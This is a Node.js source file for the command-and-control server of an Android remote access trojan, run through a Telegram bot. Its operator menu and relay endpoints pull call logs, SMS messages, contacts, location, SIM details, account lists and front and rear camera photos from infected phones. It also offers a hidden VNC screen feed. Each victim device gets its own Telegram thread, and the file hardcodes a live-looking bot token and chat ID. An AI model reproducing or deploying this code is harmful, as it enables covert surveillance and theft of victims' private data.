import express from 'express';
import cors from 'cors';
import ejs from "ejs";
import fs from "fs";
import json from "./index.json" with {type: 'json'};
import TelegramBot from "node-telegram-bot-api";

const token = "8383555140:AAH1-7lICNVuD2o_DxMvymiURNf6f5j6NIA";
const chatId = "6870193767";
const host = "10.0.120.135";
const PORT = 3000;

const bot = new TelegramBot(token, {
    polling: true
});

const app = express();
app.use(cors());
app.use(express.json({
    limit: '1gb'
}));
app.use(express.urlencoded({
    limit: '1gb',
    extended: true
}));
app.set("view engine", "ejs");
app.use(express.static("assets"));

var keyboard = [
    ["🚀 Open Extended Control Panel"],
    ["💻 Hidden VNC"],
    ["📃 Get Call Logs", "📩 Get All Messages"],
    ["👥 Get Contacts", "📱 Get All Apps"],
    ["📍 Get Location", "📶 Get SIM Card Info"],
    ["📸 Front Camera", "📸 Rear Camera"],
    ["👤 Get Account List", "🖥️ Get System Info"]
];

var devices = JSON.parse(JSON.stringify(json));

bot.on("polling_error", (e) => {
    console.log(e)
});

bot.on("message", (msg) => {
    var id = msg.chat.id;
    var text = msg.text || "";
    if (chatId != id) return bot.sendMessage(id, "✨ Contact @WuzenHQ");

    var thId = msg.message_thread_id;
    var deviceId;
    for (var thread in json) {
        if (json[thread].threadId == thId) {
            deviceId = thread;
        }
    }
    if (!deviceId) return;

    if (text == "🚀 Open Extended Control Panel") {
        bot.sendMessage(chatId, "❇️ Extended Control Panel \n\nClick the button below to open.", {
            reply_markup: {
                inline_keyboard: [
                    [{
                        "text": "🚀 Open Extended Control Panel",
                        url: `http://${host}:${PORT}?id=${deviceId}`
                    }]
                ]
            },
            message_thread_id: msg.message_thread_id
        });
    } else if (text == "💻 Hidden VNC") {
        bot.sendMessage(chatId, "🖥️ Hidden VNC \n\nClick the button below to open.", {
            reply_markup: {
                inline_keyboard: [
                    [{
                        "text": "💻 Hidden VNC",
                        url: `http://${host}:${PORT}?id=${deviceId}`
                    }]
                ]
            },
            message_thread_id: msg.message_thread_id
        });
    } else if (text == "📃 Get Call Logs") {
        sendCommand(msg.message_thread_id, "📃 Get Call Logs");
    } else if (text == "📩 Get All Messages") {
        sendCommand(msg.message_thread_id, "📩 Get All Messages");
    } else if (text == "👥 Get Contacts") {
        sendCommand(msg.message_thread_id, "👥 Get Contacts");
    } else if (text == "📱 Get All Apps") {
        sendCommand(msg.message_thread_id, "📱 Get All Apps");
    } else if (text == "📍 Get Location") {
        sendCommand(msg.message_thread_id, "📍 Get Location");
    } else if (text == "📶 Get SIM Card Info") {
        sendCommand(msg.message_thread_id, "📶 Get SIM Card Info");
    } else if (text == "📸 Front Camera") {
        sendCommand(msg.message_thread_id, "📸 Front Camera");
    } else if (text == "📸 Rear Camera") {
        sendCommand(msg.message_thread_id, "📸 Rear Camera");
    } else if (text == "👤 Get Account List") {
        sendCommand(msg.message_thread_id, "👤 Get Account List");
    } else if (text == "🖥️ Get System Info") {
        sendCommand(msg.message_thread_id, "🖥️ Get System Info");
    } else {
        sendCommand(msg.message_thread_id, "⚠️ Unrecognized command");
    }
});

function sendCommand(threadId, command) {
    for (var deviceId in json) {
        if (json[deviceId].threadId == threadId) {
            if ("res" in devices[deviceId]) {
                devices[deviceId].res.json({ call: command });
                clearTimeout(devices[deviceId].timeout);
                delete devices[deviceId].res;
                delete devices[deviceId].timeout;
            } else {
                json[deviceId].command = command;
                fs.writeFile('index.json', JSON.stringify(json, null, 2), 'utf8', (err) => {
                    if (err) console.error(err);
                });
            }
        }
    }
}

// FIXED ROUTE: Properly pass data to EJS template
app.get("/", (req, res) => {
    const id = req.query.id;
    
    if (!id) {
        return res.render("index", { 
            data: {
                status: false,
                device: 'No Device Selected',
                error: 'Please select a device from Telegram'
            }
        });
    }
    
    const deviceData = json[id];
    const isOnline = devices[id] && devices[id].res ? true : false;
    
    if (!deviceData) {
        return res.render("index", { 
            data: {
                status: false,
                device: 'Device Not Found',
                error: `Device with ID ${id} not found`
            }
        });
    }
    
    // Format the timestamp if it exists
    let formattedIssued = 'Never';
    if (deviceData.issued) {
        const date = new Date(deviceData.issued);
        formattedIssued = date.toLocaleString('en-US', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });
    }
    
    const data = {
        status: isOnline,
        device: deviceData.device || 'Unknown Device',
        os_version: deviceData.os_version || 'Unknown',
        battery: deviceData.battery || '??',
        country: deviceData.country || 'Unknown',
        ip: deviceData.ip || '?.?.?.?',
        issued: formattedIssued,
        android_id: deviceData.android_id || 'Unknown',
        brand: deviceData.brand || 'Unknown',
        model: deviceData.model || 'Unknown'
    };
    
    res.render("index", { data: data });
});

app.get('/call', (req, res) => {
    var id = req.query.id;
    if (!id) return res.json({});

    if (json[id]?.command) {
        res.json({ call: json[id].command });
        delete json[id].command;
        fs.writeFile('index.json', JSON.stringify(json, null, 2), 'utf8', (err) => {
            if (err) console.error(err);
        });
        return;
    }

    const timeout = setTimeout(() => {
        res.json({});
        if (devices[id]) {
            delete devices[id].res;
            delete devices[id].timeout;
        }
    }, 30000);

    if (!devices[id]) devices[id] = {};
    devices[id].timeout = timeout;
    devices[id].res = res;
});

app.post('/call', async (req, res) => {
    var info = req.body;
    var type = info.type;
    var id = info.id;

    if (!id) {
        return res.status(400).json({ error: 'Device ID is required' });
    }

    if (type == "a" || type == "ac") {
        if (type == "ac") {
            await createTopics(id, info, req.ip.replace("::ffff:", ""));
        }

        var inf = `<b>🟢 Device Online</b>
🏷️ Brand: ${info.brand}
🔧 Model: ${info.model}
🏭 Manufacturer: ${info.manufacturer}
🔩 Device: ${info.device}
📦 Product: ${info.product}
⚙️ SDK Version: ${info.sdk_int} | OS: Android ${info.os_version}
🔋 Battery: ${info.battery}%
🌍 Country/Region: ${info.country}
🪪 Android ID: ${info.android_id}
🈯 Language: ${info.language.toUpperCase()}
🌐 IP Address: ${req.ip}
🕒 Timezone: ${info.timezone}`;

        bot.sendMessage(chatId, inf, {
            parse_mode: "HTML",
            message_thread_id: devices[id]?.threadId || json[id]?.threadId,
            reply_markup: {
                keyboard: keyboard,
                resize_keyboard: true,
                one_time_keyboard: false
            }
        });

    } else if (type == "t") {
        var text = info.data;
        const MAX_LENGTH = 4096;
        const parts = [];
        for (let i = 0; i < text.length; i += MAX_LENGTH) {
            parts.push(text.substring(i, i + MAX_LENGTH));
        }
        parts.forEach((part, index) => {
            setTimeout(() => {
                bot.sendMessage(chatId, part, {
                    parse_mode: "HTML",
                    message_thread_id: json[id]?.threadId,
                    reply_markup: {
                        keyboard: keyboard,
                        resize_keyboard: true,
                        one_time_keyboard: false
                    }
                });
            }, index * 500);
        });

    } else if (type == "l") {
        var lat = info.lat;
        var lon = info.lon;
        bot.sendLocation(chatId, lat, lon, {
            message_thread_id: devices[id]?.threadId || json[id]?.threadId,
            reply_markup: { keyboard, resize_keyboard: true }
        });
        bot.sendMessage(chatId, info.data, {
            parse_mode: "HTML",
            message_thread_id: devices[id]?.threadId || json[id]?.threadId,
            reply_markup: { keyboard, resize_keyboard: true }
        });

    } else if (type == "c") {
        const buffer = Buffer.from(info.data, 'base64');
        await bot.sendPhoto(chatId, buffer, {
            message_thread_id: devices[id]?.threadId || json[id]?.threadId
        });
    }

    res.json({ success: true });
});

async function createTopics(id, info, ip) {
    try {
        var result = await bot.createForumTopic(chatId, info.brand + " " + info.model);
        
        if (!devices[id]) devices[id] = {};
        if (!json[id]) json[id] = {};
        
        devices[id].threadId = result.message_thread_id;
        json[id].threadId = result.message_thread_id;
        json[id].device = info.brand + " " + info.model;
        json[id].battery = info.battery;
        json[id].os_version = info.os_version;
        json[id].issued = new Date().getTime();
        json[id].country = info.country;
        json[id].ip = ip;
        json[id].brand = info.brand;
        json[id].model = info.model;
        json[id].android_id = info.android_id;

        fs.writeFile('index.json', JSON.stringify(json, null, 2), (err) => {
            if (err) console.error(err);
        });
    } catch (error) {
        console.error('Error creating forum topic:', error);
    }
}

app.post('/send', (req, res) => {
    const { id, message, action } = req.body;
    if ((!message && !action) || !id) return res.status(400).json({ error: 'Missing parameters' });

    const command = message || action;
    
    if (devices[id]?.res) {
        devices[id].res.json({ call: command });
        clearTimeout(devices[id].timeout);
        delete devices[id].res;
        delete devices[id].timeout;
        return res.json({ success: true });
    } else {
        json[id].command = command;
        fs.writeFile('index.json', JSON.stringify(json, null, 2), 'utf8', (err) => {
            if (err) {
                console.error(err);
                return res.status(500).json({ error: 'Failed to save command' });
            }
            res.json({ success: true });
        });
    }
});

app.post("/vnc", (req, res) => {
    const id = req.query.id;
    if (!id || !devices[id]) {
        return res.status(404).json({ error: 'Device not found' });
    }
    
    if (!devices[id].vnc) devices[id].vnc = {};
    devices[id].vnc = { ...devices[id].vnc, ...req.body };
    res.json({ success: true });
});

app.get('/vnc', (req, res) => {
    const id = req.query.id;
    if (!id) {
        return res.status(400).send('Device ID required');
    }

    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('X-Accel-Buffering', 'no'); // Disable buffering for nginx

    // Send initial connection message
    res.write(`data: ${JSON.stringify({ connected: true, timestamp: Date.now() })}\n\n`);

    const interval = setInterval(() => {
        if (devices[id]?.vnc) {
            res.write(`data: ${JSON.stringify(devices[id].vnc)}\n\n`);
        } else {
            res.write(`data: ${JSON.stringify({})}\n\n`);
        }
    }, 200);

    req.on('close', () => {
        clearInterval(interval);
        console.log(`VNC SSE connection closed for device ${id}`);
    });

    req.on('error', (err) => {
        console.error(`VNC SSE error for device ${id}:`, err);
        clearInterval(interval);
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        devices: Object.keys(devices).length,
        online: Object.keys(devices).filter(id => devices[id]?.res).length
    });
});

// Handle 404
app.use((req, res) => {
    res.status(404).send('Not Found');
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).send('Internal Server Error');
});

app.listen(PORT, () => {
    console.log(`Server is running at http://${host}:${PORT}`);
    console.log(`Telegram bot connected. Devices registered: ${Object.keys(json).length}`);
});
